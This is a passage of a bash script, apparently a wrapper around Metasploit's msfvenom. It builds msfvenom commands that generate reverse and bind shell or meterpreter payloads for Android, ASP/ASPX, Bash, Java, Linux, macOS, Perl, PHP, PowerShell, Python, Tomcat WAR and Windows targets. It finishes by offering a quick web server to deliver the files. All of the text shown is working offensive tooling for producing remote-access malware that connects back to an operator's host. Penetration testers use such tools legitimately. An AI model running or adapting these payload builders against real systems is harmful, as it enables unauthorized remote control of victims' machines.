if [[ -n "${TYPE}" && "${STAGE}" != "staged" && "${STAGE}" != "stageless" && -n "${STAGE}" ]]; then
  echo -e " ${YELLOW}[i]${RESET} STAGED (${STAGE}) is incorrect. Needs to be either ${YELLOW}staged${RESET} or ${YELLOW}stageless${RESET}" >&2
  exit 3
elif [[ -n "${TYPE}" && "${_STAGE}" != "/" && "${_STAGE}" != "_" && -n "${STAGE}" ]]; then    #  "${STAGE}" != "" is correct
  echo -e " ${YELLOW}[i]${RESET} ${RED}Something went wrong (Internally) with stage: ${_STAGE}.${RESET}"
  exit 2
fi

## If its not reverse (bind), the only option is tcp (not http/https/find_ports)
if [[ "${DIRECTION}" != "reverse" && "${METHOD}" != "tcp" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Unable to use ${METHOD} with ${DIRECTION}. Please ${YELLOW}switch to reverse${RESET}" >&2
  exit 3
fi


## Bind shell does not use LHOST
LHOST=""
[[ "${DIRECTION}" == "reverse" ]] \
  && LHOST="LHOST=${IP}"


## Generate #2 (Single Payload)
## APK
if [[ "${TYPE}" == "apk" ]]; then
  [[ -z "${SHELL}" ]] \
    && SHELL="meterpreter"
  [[ -z "${STAGE}" ]] \
    && STAGE="stageless" \
    && _STAGE="/"
  [[ "${METHOD}" == "find_port" ]] \
    && METHOD="allports"
  TYPE="android"
  FILEEXT="apk"
  PAYLOAD="android/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} \\\\\n  ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"


## ASP
elif [[ "${TYPE}" == "asp" ]]; then
  [[ -z "${SHELL}" ]] \
    && SHELL="meterpreter"
  [[ -z "${STAGE}" ]] \
    && STAGE="staged" \
    && _STAGE="/"
  [[ "${METHOD}" == "find_port" ]] \
    && METHOD="allports"
  # Can't do: stageless meterpreter - The EXE generator now has a max size of 2048 bytes, please fix the calling module
  if [[ "${STAGE}" == "stageless" && "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} ASP. The result is over Metasploit's ${RED}file size limit${RESET}. =(" >&2
    #[[ "${VERBOSE}" != 'true' ]] && exit 5   # Force pass the warning?
  fi
  TYPE="windows"
  FILEEXT="asp"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\n  --platform ${TYPE} -a x86 -e generic/none ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## ASPX
elif [[ "${TYPE}" == "aspx" ]]; then
  [[ -z "${SHELL}" ]] \
    && SHELL="meterpreter"
  [[ -z "${STAGE}" ]] \
    && STAGE="staged" \
    && _STAGE="/"
  [[ "${METHOD}" == "find_port" ]] \
    && METHOD="allports"
  # Its able todo anything that you throw at it =).
  TYPE="windows"
  FILEEXT="aspx"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\n  --platform ${TYPE} -a x86 -e generic/none ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## Bash
elif [[ "${TYPE}" == "bash" || "${TYPE}" == "sh" ]]; then
  [[ -z "${SHELL}" ]] \
    && SHELL="shell"
  [[ -z "${STAGE}" ]] \
    && STAGE="staged" \
    && _STAGE="/"
  # Can't do: meterpreter or stageless - Invalid Payload Selected
  # Can't do: bind option // http, https or find_port options
  if [[ "${STAGE}" == "stageless" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE}. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  elif [[ "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${SHELL} Bash. There ${RED}isn't a Bash ${SHELL}${RESET}...yet?" >&2
  elif [[ "${DIRECTION}" != "reverse" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${DIRECTION}. There ${RED}isn't a ${DIRECTION} Bash${RESET}...yet?" >&2
  fi
  TYPE="bash"
  FILEEXT="sh"
  PAYLOAD="cmd/unix${_STAGE}${DIRECTION}_bash"
  CMD="msfvenom -p ${PAYLOAD} -f raw \\\\\n  --platform unix -e generic/none -a cmd ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## Java
elif [[ "${TYPE}" == "java" || "${TYPE}" == "jsp" ]]; then
  [[ -z "${SHELL}" ]] \
    && SHELL="meterpreter"
  [[ -z "${STAGE}" ]] \
    && STAGE="staged" \
    && _STAGE="/"
  # Can't do: stageless meterpreter - Invalid Payload Selected
  if [[ "${STAGE}" == "stageless" && "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} Java. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  fi
  TYPE="java"
  FILEEXT="jsp"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} -f raw \\\\\n  --platform ${TYPE} -e generic/none -a ${TYPE} ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## Linux
elif [[ "${TYPE}" == "linux" || "${TYPE}" == "lin" || "${TYPE}" == "elf" ]]; then
  [[ -z "${SHELL}" ]] \
    && SHELL="shell"
  [[ -z "${STAGE}" ]] \
    && STAGE="staged" \
    && _STAGE="/"
  # Can't do: stageless meterpreter - Invalid Payload Selected
  if [[ "${STAGE}" == "stageless" && "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} Linux. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  fi
  TYPE="linux"
  FILEEXT="elf"    #bin
  PAYLOAD="${TYPE}/x86/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\n  --platform ${TYPE} -a x86 -e generic/none ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## OSX
elif [[ "${TYPE}" == "osx" || "${TYPE}" == "macho" ]]; then
  [[ -z "${SHELL}" ]] \
    && SHELL="shell"
  [[ -z "${STAGE}" ]] \
    && STAGE="stageless" \
    && _STAGE="_"
  # Can't do: meterpreter or stageless - Invalid Payload Selected
  if [[ "${STAGE}" == "staged" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} OSX. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  elif [[ "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${SHELL} OSX. There ${RED}isn't a OSX Meterpreter${RESET}...yet." >&2
  fi
  TYPE="osx"
  FILEEXT="macho"
  PAYLOAD="osx/x86/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\n  --platform ${TYPE} -a x86 -e generic/none ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## Perl
elif [[ "${TYPE}" == "perl" || "${TYPE}" == "pl" ]]; then
  [[ -z "${SHELL}" ]] \
    && SHELL="shell"
  [[ -z "${STAGE}" ]] \
    && STAGE="staged" \
    && _STAGE="/"
  # Can't do: meterpreter or stageless - Invalid Payload Selected
  if [[ "${STAGE}" == "stageless" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} PERL. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  elif [[ "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${SHELL} PERL. There ${RED}isn't a PERL Meterpreter${RESET}...yet." >&2
  fi
  TYPE="linux"
  FILEEXT="pl"
  PAYLOAD="cmd/unix${_STAGE}${DIRECTION}_perl"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\n  --platform unix -a cmd -e generic/none ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## PHP
elif [[ "${TYPE}" == "php" ]]; then
  [[ -z "${SHELL}" ]] \
    && SHELL="meterpreter"
  [[ -z "${STAGE}" ]] \
    && STAGE="staged" \
    && _STAGE="/"
  # Can't do: shell - Invalid Payload Selected
  if [[ "${SHELL}" == "shell" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${SHELL} PHP. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  fi
  TYPE="php"
  FILEEXT="php"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} -f raw \\\\\n  --platform ${TYPE} -e generic/none -a ${TYPE} ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## Powershell
elif [[ "${TYPE}" == "powershell" || "${TYPE}" == "ps1" ]]; then
  [[ -z "${SHELL}" ]] \
    && SHELL="meterpreter"
  [[ -z "${STAGE}" ]] \
    && STAGE="stageless" \
    && _STAGE="_"
  [[ "${METHOD}" == "find_port" ]] \
    && METHOD="allports"
  TYPE="windows"
  FILEEXT="ps1"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} -f ps1 \\\\\n  --platform ${TYPE} -e generic/none -a x86 ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## Python
elif [[ "${TYPE}" == "python" || "${TYPE}" == "py" ]]; then
  [[ -z "${SHELL}" ]] \
    && SHELL="meterpreter"
  [[ -z "${STAGE}" ]] \
    && STAGE="staged" \
    && _STAGE="/"
  # Cant do: staged shell // stageless meterpreter // stageless bind - Invalid Payload Selected
  if [[ "${STAGE}" == "staged" && "${SHELL}" == "shell" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} Python. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  elif [[ "${STAGE}" == "stageless" && "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} Python. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  elif [[ "${STAGE}" == "stageless" && "${DIRECTION}" == "bind" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${DIRECTION} Python. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  fi
  TYPE="python"
  FILEEXT="py"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} -f raw \\\\\n  --platform ${TYPE} -e generic/none -a ${TYPE} ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## Tomcat
elif [[ "${TYPE}" == "tomcat" || "${TYPE}" == "war" ]]; then
  [[ -z "${SHELL}" ]] \
    && SHELL="meterpreter"
  [[ -z "${STAGE}" ]] \
    && STAGE="staged" \
    && _STAGE="/"
  # Cant do: stageless meterpreter // stageless bind // find_ports    (Invalid Payload Selected)
  if [[ "${STAGE}" == "stageless" && "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} Tomcat. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  elif [[ "${STAGE}" == "stageless" && "${DIRECTION}" == "bind" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${DIRECTION} ${STAGE} Tomcat. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  elif [[ "${METHOD}" == "find_ports" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${METHOD} Tomcat. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  fi
  TYPE="tomcat"
  FILEEXT="war"
  PAYLOAD="java/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} -f raw \\\\\n  --platform java -a x86 -e generic/none ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## Windows
elif [[ "${TYPE}" == "windows" || "${TYPE}" == "win" || "${TYPE}" == "exe" || "${TYPE}" == "dll" || "${TYPE}" == "srv" ]]; then
  [[ -z "${SHELL}" ]] \
    && SHELL="meterpreter"
  [[ -z "${STAGE}" ]] \
    && STAGE="staged" \
    && _STAGE="/"
  [[ "${METHOD}" == "find_port" ]] \
    && METHOD="allports"
  # Its able todo anything that you throw at it =).
  FILEEXT="exe"
  [[ "${TYPE}" == "dll" ]] && FILEEXT="dll"
  [[ "${TYPE}" == "srv" ]] && FILEEXT="exe-service"
  TYPE="windows"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\n  --platform ${TYPE} -a x86 -e generic/none ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT%-service}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## Batch/Loop modes
elif [[ "${BATCH}" == "true" || "${LOOP}" == "true" ]]; then
  #SUCCESS=true
  exit 0

## Blank input
elif [[ -z "${TYPE}" ]]; then
  echo -e "\n ${YELLOW}[i]${RESET} ${YELLOW}Missing TYPE${RESET} or ${YELLOW}BATCH/LOOP mode${RESET}"

## Unexpected input
else
  echo -e "\n ${YELLOW}[i]${RESET} Unknown type: ${YELLOW}${TYPE}${RESET}" >&2
fi


#-Done--------------------------------------------------------#


##### Done!
if [[ "${SUCCESS}" == true ]]; then
  echo -e " ${GREEN}[?]${RESET} ${GREEN}Quick web server${RESET} (for file transfer)?: python3 -m http.server 8080"
  echo -e " ${BLUE}[*]${RESET} ${BLUE}Done${RESET}!"
else
  doHelp
fi

exit 0
